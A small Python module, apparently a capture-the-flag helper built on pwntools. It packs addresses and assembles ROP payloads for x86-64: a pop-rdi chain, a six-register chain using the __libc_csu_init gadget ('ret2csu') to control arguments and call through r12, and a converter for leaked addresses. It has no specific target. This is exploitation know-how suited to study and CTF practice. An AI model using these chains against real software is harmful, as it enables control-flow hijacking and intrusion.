from pwn import *


def to_p64(addr):
    if isinstance(addr, int):
        return p64(addr)
    return addr


def rop2(pop_rdi, param_addr, ret_addr):
    payload =  to_p64(pop_rdi)      # pop rdi
    payload += to_p64(param_addr)   # attr_addr
    payload += to_p64(ret_addr)     # ret
    return payload


def rop6(pop6, r12, r13, r14, r15, rop2_addr, ret_addr):
    payload =  to_p64(pop6)         # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
    payload += to_p64(0)            # rbx
    payload += to_p64(1)            # rbp
    payload += to_p64(r12)          # r12 -> rip
    payload += to_p64(r13)          # r13 -> rdx
    payload += to_p64(r14)          # r14 -> rsi
    payload += to_p64(r15)          # r15 -> rdi
    payload += to_p64(rop2_addr)    # $:mov rdx, r13;
                                    # mov rsi, r14;
                                    # mov edi, r15;
                                    # call ds:[r12+rbx*8]
                                    # add rbx, 1
                                    # cmp rbx, rbp
                                    # jnz short $
                                    # pop6;ret
    payload += b'a'*56
    payload += to_p64(ret_addr)
    return payload


def to_address(addr, keepline=True):
    if keepline and addr.endswith(b'\n'):
        addr = addr[:-1]
    return u64(addr.ljust(8, b'\x00'))
